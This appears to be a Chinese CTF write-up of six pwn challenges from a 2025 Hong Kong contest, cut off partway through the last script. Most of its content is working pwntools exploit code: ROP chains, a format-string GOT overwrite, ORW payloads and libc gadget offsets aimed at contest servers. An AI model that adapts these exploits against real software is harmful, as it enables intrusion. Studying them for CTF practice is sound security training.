---
title: 2025香港CTF二进制（PWN）WRITEUP
url: https://mp.weixin.qq.com/s/3P5zgo4LTWkAlqle-jRm0A
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:25:32.191518
---

# 2025香港CTF二进制（PWN）WRITEUP

# 2025香港CTF二进制（PWN）WRITEUP

佚名
佚名

Gh0xE9

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# ![图片](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaDQtpia06dHxORpdAibbGcIB6X7hWKc5LyIeIYEVEMkrRicniaRvlicOHFoz3PQJ7qxetEUZDdsAbKK8qEDlyH91iaZ38j8OM96OWOibI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0) Pwn

## a\_strange\_rop [solved]

存在system函数，以及binsh字符串

## ![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaBf3OIic0SoRff6oJgL09PXQw2eIFAJdicPWmWMq5Dtrc60ibW9kCtlEOzOMAm9pUre7nx3y0licfULODzh5t8e5acS7NTwtyCSGEs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaDJC3fXLL7s3VfLhfiawyKyaJNck0D5aazhhRMPdLQPV0ibLjGs1uHX25VSWsja30X56fnt2XLFI8c4fWEuHTfnWr2jaZYHXRVm4/640?wx_fmt=png&from=appmsg)

通过负数溢出来构造ROP链即可

```
from gt import *con("amd64")# io = process("./pwn3")io=remote("pwn-4986672e32.challenge.xctf.org.cn", 9999, ssl=True)io.sendlineafter("Number:","-2")pop_rdi = 0x00000000004012f1 #: pop rdi ; retret = 0x4012E0binsh = 0x404078# gdb.attach(io)io.sendlineafter("Result:",str(binsh))io.sendlineafter("Number:","-1")io.sendlineafter("Result:",str(ret))io.sendlineafter("Number:","-3")io.sendlineafter("Result:",str(pop_rdi))io.interactive()
```

## nofile [solved]

没有给出附件，根据远程提示发现是盲打格式化字符串，通过泄露栈上数据找到ELF基地址然后dump程序，发现存在后门

![](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaA2xlxTL4DgLcpZBicyj729bfWtTZdIYoOdqBia0Pic28K2u3P6MSLFG0fT4MIMbibyDd7zicjgWt9N5VfNXyvrUPoJgfRMYTZibrWgM/640?wx_fmt=png&from=appmsg)

可以根据修改got表来触发后门

![](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaDLB4rozDcRwV7CwAy4t79EvWXJVJwBwmkiabdNTwhIw1ZicveTAXkmPARSNg45XIvbZVTIkocPPWaialvMO7lGRYCKx01MAZOpBc/640?wx_fmt=png&from=appmsg)

```
import osimport sysimport timefrom gt import *from ctypes import *import binasciicontext.os = 'linux'context.log_level = "debug"context(os = 'linux',log_level = "debug",arch = 'amd64')s       = lambda data               :p.send(str(data))sa      = lambda delim,data         :p.sendafter(str(delim), str(data))sl      = lambda data               :p.sendline(str(data))sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))r       = lambda num                :p.recv(num)ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)itr     = lambda                    :p.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\x00'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))context.terminal = ['gnome-terminal','-x','sh','-c']x64_32 = 1if x64_32:    context.arch = 'amd64'else:    context.arch = 'i386'#p=process('./pwn')p =remote("pwn-f58ea7da22.challenge.xctf.org.cn", 9999, ssl=True)# begin= 0x4012E0# pl=b"%7$pdump"+p32(begin)# pl = b"%8$xaa" +b"c"*8 + p64(begin) # p64(begin)pl = b"%105$p"p.recvuntil("> ")p.sendline(pl)base = int(p.recv(14),16) - 0x40suc("base",base)pl = fmtstr_payload(6,{base+0x4038:base+0x0129D})p.recvuntil("> ")p.sendline(pl)# bin = b''# def leak(addr):#     pl=b"%7$sdump"+p64(addr)#     p.recvuntil("> ")#     p.sendline(pl)#     data=p.recvuntil('dump',drop=True)#     # data = p.recvrepeat(5)#     return data# begin = base# # aa = leak(begin)# # print(begin)# try:#     while True:#         data = leak(begin)#         begin = begin+len(data)#         bin += data#         if len(data)==0:#             begin+=1#             bin += '\x00'# except:#     print("finish")# finally:#     print('[+]',len(bin))#     with open('dump_bin','wb') as f:#         f.write(bin)p.interactive()
```

## stop[solved]

存在缓冲区溢出，存在沙箱，orw读取flag

# ![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaCHfI8icu3QxXToUvDMvaQzSUz6QznaHAQRTAwjX0bibNeM2rpkrmW40GIDgwNUicpxln2cmR1rqEDH0d7TiaIkK2VsTfwianh0Iryg/640?wx_fmt=png&from=appmsg)

from gt import \*

con("amd64")

# io = process("./pwn5")

io = remote("pwn-a9bf7264b0.challenge.xctf.org.cn", 9999, ssl=True)

libc = ELF("./libc.so.6")

io.recvuntil(" here?")

payload = b'a'\*0x10

# gdb.attach(io)

io.send(payload)

io.recvuntil(" this!")

lv = 0x4012D3

pop\_rbp = 0x00000000004011bd #: pop rbp ; ret

payload =b'b'\*0x70+p64(0x404080+0x400)+ p64(0x4011AD) + p64(0x40128B)

# payload = b'b'\*0x70+p64(0x404080+0x70) + p64(0x4012B8)

# # payload = b'b'\*0x70 + p64(0x404028+0x70) + p64(0x4012B8)

io.send(payload)

io.recv(1)

libc\_base = u64(io.recv(6).ljust(8,b'\x00')) -0x2045c0

suc("libc\_base",libc\_base)

open1=libc\_base+libc.sym['open']

read1=libc\_base + libc.sym['read']

write1=libc\_base + libc.sym['write']

pop\_rdi = libc\_base + 0x000000000010f78b #: pop rdi ; ret

pop\_rsi = libc\_base + 0x0000000000110a7d #: pop rsi ; ret

pop\_rdx = libc\_base + 0x00000000000981ad #: pop rdx ; leave ; ret

payload = b'a'\*0x10

# gdb.attach(io)

io.send(payload)

io.recvuntil(" this!")

payload = b'/flag\x00\x00\x00' + b'c'\*0x68 + p64(0x404080+0x400)

payload += p64(pop\_rdi)+p64(0x404410) + p64(pop\_rsi) + p64(0) + p64(open1) + p64(pop\_rdi) + p64(3) + p64(pop\_rsi) + p64(0x404410-0x200) +p64(pop\_rbp) +p64(0x4044e8)+ p64(pop\_rdx) + p64(0x100) + p64(read1)

payload += p64(pop\_rdi)+p64(1) + p64(pop\_rsi) + p64(0x404410-0x200) + p64(write1)

# gdb.attach(io)

io.send(payload)

io.interactive()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaAdK0mwUIPR9iaGAYUibuCbD0a59iaGIeia1RN4whRwD9vj79zTia9ic9EJEGWlntX7jTEoG2b0Ca7n7T5KDy5ZtZ94uPEbBksXjGoNM/640?wx_fmt=png&from=appmsg)

## filesystem [solved]

过滤不严格存在命令注入

![](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaBwsqKXGFCvwnKJ3Sy3MpFn6EkPYkS7DBJWH7AM7RJBt28UHuaBw9UJK1xbQOt7IxugHDgFSc4jjbTr9Kw1DBNvHv7QHy7XKFg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaBDMJMiaU4ZUZiaQiaLcwjxss3JP4vpAic7ljXWpW5C3ZF2vBXEYhxaszfT6ecCNPjyPVTLuM74vYnnOAnOibQicvQicjQicE9se16P43g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaCqicKiapMndAFWz6D4DdpeiaEcbOAGJkFTd4njGSmVKeI7QCqcE1R9qt46DJWicke0OZxyfPzd9jVHCDr0YWTVaKVgQTOZsnczibxo/640?wx_fmt=png&from=appmsg)

## filesystem-revenge [solved]

和之前的一样没有过滤严格

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaBuEiaLNHxp28DHibWM3TY5fCJ5aSjWQyBMof8qFYDIUpl3K6KQmia9RE6b22ByHvCSZPpwSySVgUtlicEFU9eI6yaATJPoCFJx6tg/640?wx_fmt=png&from=appmsg)

# ![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaBrULJAwjKr8Nau69NSTA0jPUH7JH2tp1818PEv1VMuQiaZrpueMNDKp4kVL1Vf9icFAIs3ick7kjhiaZDic7ZtLJhMlFpJaTMeNTzw/640?wx_fmt=png&from=appmsg)

## compress [solved]

存在整数溢出可以修改到libc相关地址，劫持puts函数调用指针，寻找一个可以进行栈迁移的gadget打ORW输出flag

![](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaBcowww2gN6PQgIqbmibrWH9KI3geZ0ThwhKDf0BYW6noaSm4cg20A4NvjJQZkA2eNqRb88ToBnWefkMiar0icLWC7DBHyPtFCwib4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaA2PPzXp7VNoTHxo1ulAzd616hclbdRI2AjxXWVL0FacHmnXibERd4McQDSSiavNIVISibwIuhXc7t73EvwSsVQkCziazefcebIibtI/640?wx_fmt=png&from=appmsg)

from gt import \*

con("amd64")

libc = ELF("./libc.so")

# io = process("./pwn6")

io = remote("pwn-03b66f4167.challenge.xctf.org.cn", 9999, ssl=True)

io.recvuntil(">>")

# gdb.attach(io)

io.sendline("2")

libc\_base = u64(io.recv(6).ljust(8,b'\x00'))  -0x292e50

suc("libc\_base",libc\_base)

io.recvuntil(">>")

io.sendline("1")

io.recvuntil("offset:")

io.sendline("-12528")

io.recvuntil("Content:")

pop\_rdi =libc\_base + 0x0000000000014862#: pop rdi; ret;

jmp\_rax = libc\_base+0x000000000001f1bd#: jmp rax;

jmp\_rdi = libc\_base + 0x0000000000021faa#: jmp qword ptr [rdi];

system =libc\_base +0x42688

binsh = libc\_base + 0x291345

pop\_rsp = libc\_base+0x0000000000004628#: pop rsp; ret;

pop4 = libc\_base+0x00000000000145a0#: pop rbx; pop rbp; pop r12; pop r13; ret;

jmpp = libc\_base+0x000000000009090b#: jmp qword ptr [rdi - 0x24];

gadget = libc\_base + 0x4951A

pop\_rsi = libc\_base + 0x000000000001c237#: pop rsi; ret;

pop\_rdx = libc\_base + 0x000000000001bea2#: pop rdx; ret;

ret = libc\_base +0x0000000000000cdc#: ret;

open1=libc\_base+libc....